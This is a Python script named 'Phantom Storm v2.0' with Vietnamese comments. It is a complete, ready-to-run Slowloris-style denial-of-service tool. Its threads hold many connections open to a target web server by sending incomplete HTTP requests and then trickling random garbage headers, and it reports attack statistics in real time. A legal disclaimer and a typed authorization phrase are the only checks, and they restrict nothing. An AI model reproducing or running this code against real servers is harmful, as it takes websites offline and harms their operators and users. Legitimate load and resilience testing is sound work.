#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Phantom Storm v2.0 - Layer 7 HTTP Keep-Alive DoS Testing Tool
=============================================================
LEGAL DISCLAIMER:
    This tool is designed EXCLUSIVELY for authorized penetration testing
    in controlled lab environments. Unauthorized use against systems you
    do not own or have explicit written permission to test is ILLEGAL.
    
    The developers assume NO LIABILITY for misuse of this software.
    USE AT YOUR OWN RISK.
=============================================================
"""

import socket
import threading
import random
import time
import sys
import logging
from datetime import datetime
from collections import defaultdict
from typing import Optional
import os

# ============================================================================
# CONFIGURATION & CONSTANTS
# ============================================================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"
]

class Colors:
    """ANSI color codes cho terminal output"""
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# ============================================================================
# STATISTICS TRACKER
# ============================================================================

class AttackStatistics:
    """Theo dõi và hiển thị thống kê real-time"""
    
    def __init__(self):
        self.lock = threading.Lock()
        self.connections_established = 0
        self.connections_active = 0
        self.connections_failed = 0
        self.total_packets_sent = 0
        self.error_types = defaultdict(int)
        self.start_time = time.time()
        
    def connection_established(self):
        with self.lock:
            self.connections_established += 1
            self.connections_active += 1
            
    def connection_closed(self):
        with self.lock:
            if self.connections_active > 0:
                self.connections_active -= 1
                
    def connection_failed(self, error_type: str = "unknown"):
        with self.lock:
            self.connections_failed += 1
            self.error_types[error_type] += 1
            
    def packet_sent(self):
        with self.lock:
            self.total_packets_sent += 1
            
    def get_stats(self) -> dict:
        with self.lock:
            runtime = time.time() - self.start_time
            return {
                'runtime': runtime,
                'connections_established': self.connections_established,
                'connections_active': self.connections_active,
                'connections_failed': self.connections_failed,
                'total_packets': self.total_packets_sent,
                'packets_per_second': self.total_packets_sent / runtime if runtime > 0 else 0,
                'success_rate': (self.connections_established / (self.connections_established + self.connections_failed) * 100) 
                               if (self.connections_established + self.connections_failed) > 0 else 0,
                'error_types': dict(self.error_types)
            }

# ============================================================================
# LOGGING SETUP
# ============================================================================

def setup_logging(log_file: Optional[str] = None):
    """Cấu hình logging system"""
    log_format = '%(asctime)s - [%(levelname)s] - %(message)s'
    date_format = '%Y-%m-%d %H:%M:%S'
    
    handlers = [logging.StreamHandler()]
    
    if log_file:
        os.makedirs('logs', exist_ok=True)
        file_handler = logging.FileHandler(f'logs/{log_file}', mode='a', encoding='utf-8')
        handlers.append(file_handler)
    
    logging.basicConfig(
        level=logging.INFO,
        format=log_format,
        datefmt=date_format,
        handlers=handlers
    )

# ============================================================================
# BANNER & UI
# ============================================================================

def print_banner():
    """Hiển thị banner và legal disclaimer"""
    banner = f"""{Colors.OKCYAN}
    ____  _   _    _    _   _ _____ ___  __  __   ____ _____ ___  ____  __  __ 
   |  _ \| | | |  / \  | \ | |_   _/ _ \|  \/  | / ___|_   _/ _ \|  _ \|  \/  |
   | |_) | |_| | / _ \ |  \| | | || | | | |\/| | \___ \ | || | | | |_) | |\/| |
   |  __/|  _  |/ ___ \| |\  | | || |_| | |  | |  ___) || || |_| |  _ <|  |  |
   |_|   |_| |_/_/   \_\_| \_| |_| \___/|_|  |_| |____/ |_| \___/|_| \_\_|  |_|
{Colors.ENDC}   
                {Colors.BOLD}>> [ LAYER 7 HTTP KEEP-ALIVE DOS TESTING TOOL ] <<{Colors.ENDC}
   ===========================================================================
   {Colors.OKGREEN}[+] Version    : 2.0 Professional Edition
   [+] Purpose    : Authorized Penetration Testing Only
   [+] Features   : Real-time Stats | Logging | Error Handling{Colors.ENDC}
   ===========================================================================
    """
    print(banner)
    
    disclaimer = f"""{Colors.WARNING}
   {Colors.BOLD}⚠️  LEGAL DISCLAIMER ⚠️{Colors.ENDC}{Colors.WARNING}
   
   This tool is intended ONLY for authorized security testing in controlled
   lab environments. You MUST have explicit written permission to test any
   target system. Unauthorized use is ILLEGAL and may result in criminal
   prosecution.
   
   By using this tool, you acknowledge that you are solely responsible for
   your actions and any consequences thereof.
   {Colors.ENDC}"""
    print(disclaimer)

def print_stats_header():
    """In header cho bảng thống kê"""
    print(f"\n{Colors.OKBLUE}{'='*80}")
    print(f"{'REAL-TIME ATTACK STATISTICS':^80}")
    print(f"{'='*80}{Colors.ENDC}\n")

# ============================================================================
# ATTACK WORKER
# ============================================================================

class AttackWorker:
    """Worker class để thực hiện attack từ mỗi thread"""
    
    def __init__(self, target_ip: str, target_port: int, stats: AttackStatistics, 
                 worker_id: int, timeout: int = 4, keep_alive_interval: int = 3):
        self.target_ip = target_ip
        self.target_port = target_port
        self.stats = stats
        self.worker_id = worker_id
        self.timeout = timeout
        self.keep_alive_interval = keep_alive_interval
        self.running = True
        
    def stop(self):
        """Dừng worker"""
        self.running = False
        
    def run(self):
        """Main worker loop - Slowloris style attack"""
        while self.running:
            sock = None
            try:
                # Tạo socket connection
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                sock.connect((self.target_ip, self.target_port))
                
                self.stats.connection_established()
                logging.debug(f"Worker {self.worker_id}: Connection established")
                
                # Chuẩn bị HTTP request không hoàn chỉnh
                rand_param = random.randint(1, 999999)
                user_agent = random.choice(USER_AGENTS)
                
                http_request = (
                    f"GET /?storm={rand_param} HTTP/1.1\r\n"
                    f"Host: {self.target_ip}\r\n"
                    f"User-Agent: {user_agent}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Keep-Alive: timeout=300, max=1000\r\n"
                )
                
                sock.send(http_request.encode('utf-8'))
                self.stats.packet_sent()
                
                # Keep-alive loop: liên tục gửi garbage headers
                while self.running:
                    time.sleep(self.keep_alive_interval)
                    
                    # Gửi garbage header để giữ connection alive
                    garbage_header = f"X-Phantom-{random.randint(1,9999)}: {random.randint(1,99999)}\r\n"
                    sock.send(garbage_header.encode('utf-8'))
                    self.stats.packet_sent()
                    
            except socket.timeout:
                self.stats.connection_failed("timeout")
                logging.debug(f"Worker {self.worker_id}: Connection timeout")
                
            except socket.error as e:
                error_type = type(e).__name__
                self.stats.connection_failed(error_type)
                logging.debug(f"Worker {self.worker_id}: Socket error - {error_type}")
                
            except Exception as e:
                error_type = type(e).__name__
                self.stats.connection_failed(error_type)
                logging.error(f"Worker {self.worker_id}: Unexpected error - {e}")
                
            finally:
                # Cleanup
                if sock:
                    try:
                        sock.close()
                        self.stats.connection_closed()
                    except:
                        pass
                
                # Delay trước khi reconnect
                if self.running:
                    time.sleep(0.5)

# ============================================================================
# STATISTICS MONITOR
# ============================================================================

def stats_monitor(stats: AttackStatistics, update_interval: int = 2):
    """Thread để hiển thị thống kê real-time"""
    print_stats_header()
    
    while True:
        try:
            time.sleep(update_interval)
            current_stats = stats.get_stats()
            
            # Clear previous lines và in stats mới
            runtime_str = time.strftime('%H:%M:%S', time.gmtime(current_stats['runtime']))
            
            output = f"""{Colors.OKGREEN}
[Runtime: {runtime_str}]
├─ Active Connections    : {current_stats['connections_active']:,}
├─ Total Established     : {current_stats['connections_established']:,}
├─ Total Failed          : {current_stats['connections_failed']:,}
├─ Success Rate          : {current_stats['success_rate']:.2f}%
├─ Total Packets Sent    : {current_stats['total_packets']:,}
└─ Packets/Second        : {current_stats['packets_per_second']:.2f}
{Colors.ENDC}"""
            
            # In top 3 error types nếu có
            if current_stats['error_types']:
                sorted_errors = sorted(current_stats['error_types'].items(), 
                                     key=lambda x: x[1], reverse=True)[:3]
                output += f"{Colors.WARNING}\n[Top Errors]\n"
                for error_type, count in sorted_errors:
                    output += f"  • {error_type}: {count:,}\n"
                output += Colors.ENDC
            
            print(output)
            
        except KeyboardInterrupt:
            break
        except Exception as e:
            logging.error(f"Stats monitor error: {e}")

# ============================================================================
# MAIN FUNCTION
# ============================================================================

def validate_target(target_ip: str, target_port: int) -> bool:
    """Kiểm tra xem target có accessible không"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((target_ip, target_port))
        sock.close()
        return result == 0
    except:
        return False

def get_user_confirmation() -> bool:
    """Yêu cầu xác nhận từ user về authorization"""
    print(f"\n{Colors.WARNING}{Colors.BOLD}AUTHORIZATION CHECK:{Colors.ENDC}")
    print(f"{Colors.WARNING}Do you have EXPLICIT WRITTEN PERMISSION to test this target?{Colors.ENDC}")
    response = input(f"{Colors.WARNING}Type 'YES I AM AUTHORIZED' to continue: {Colors.ENDC}")
    return response.strip() == "YES I AM AUTHORIZED"

def main():
    print_banner()
    
    # Validate arguments
    if len(sys.argv) < 4:
        print(f"{Colors.FAIL}[ERROR] Invalid arguments!{Colors.ENDC}\n")
        print(f"{Colors.OKBLUE}Usage:{Colors.ENDC}")
        print(f"  python3 phantom_storm.py [Target_IP] [Port] [Threads]\n")
        print(f"{Colors.OKBLUE}Example:{Colors.ENDC}")
        print(f"  python3 phantom_storm.py 192.168.1.100 80 200\n")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    threads_count = int(sys.argv[3])
    
    # Authorization check
    if not get_user_confirmation():
        print(f"\n{Colors.FAIL}[ABORTED] Authorization not confirmed. Exiting...{Colors.ENDC}\n")
        sys.exit(1)
    
    # Setup logging
    log_filename = f"phantom_storm_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    setup_logging(log_filename)
    logging.info(f"Starting Phantom Storm v2.0 - Target: {target_ip}:{target_port}")
    
    # Validate target
    print(f"\n{Colors.OKCYAN}[*] Validating target accessibility...{Colors.ENDC}")
    if not validate_target(target_ip, target_port):
        print(f"{Colors.WARNING}[!] Warning: Target appears unreachable. Continue anyway? (y/n): {Colors.ENDC}", end='')
        if input().lower() != 'y':
            print(f"{Colors.FAIL}[ABORTED]{Colors.ENDC}\n")
            sys.exit(1)
    else:
        print(f"{Colors.OKGREEN}[✓] Target is accessible{Colors.ENDC}")
    
    # Initialize statistics
    stats = AttackStatistics()
    
    # Start attack
    print(f"\n{Colors.OKGREEN}[*] Launching attack on {target_ip}:{target_port}{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[*] Spawning {threads_count} attack threads...{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[*] Log file: logs/{log_filename}{Colors.ENDC}")
    print(f"{Colors.WARNING}[*] Press Ctrl+C to stop{Colors.ENDC}")
    
    logging.info(f"Spawning {threads_count} attack threads")
    
    # Create và start workers
    workers = []
    for i in range(threads_count):
        worker = AttackWorker(target_ip, target_port, stats, worker_id=i)
        thread = threading.Thread(target=worker.run, daemon=True)
        thread.start()
        workers.append(worker)
        time.sleep(0.01)  # Stagger thread creation
    
    # Start stats monitor
    monitor_thread = threading.Thread(target=stats_monitor, args=(stats,), daemon=True)
    monitor_thread.start()
    
    # Main loop
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n{Colors.WARNING}[!] Interrupt received. Shutting down gracefully...{Colors.ENDC}")
        
        # Stop all workers
        for worker in workers:
            worker.stop()
        
        time.sleep(2)  # Allow threads to cleanup
        
        # Final stats
        final_stats = stats.get_stats()
        print(f"\n{Colors.OKBLUE}{'='*80}")
        print(f"{'FINAL STATISTICS':^80}")
        print(f"{'='*80}{Colors.ENDC}")
        print(f"{Colors.OKGREEN}")
        print(f"Total Runtime          : {time.strftime('%H:%M:%S', time.gmtime(final_stats['runtime']))}")
        print(f"Connections Established: {final_stats['connections_established']:,}")
        print(f"Connections Failed     : {final_stats['connections_failed']:,}")
        print(f"Success Rate           : {final_stats['success_rate']:.2f}%")
        print(f"Total Packets Sent     : {final_stats['total_packets']:,}")
        print(f"Average Packets/Second : {final_stats['packets_per_second']:.2f}")
        print(f"{Colors.ENDC}")
        
        logging.info("Attack completed. Final stats logged.")
        print(f"{Colors.OKGREEN}[✓] Shutdown complete. Check logs/{log_filename} for details.{Colors.ENDC}\n")

if __name__ == "__main__":
    main()
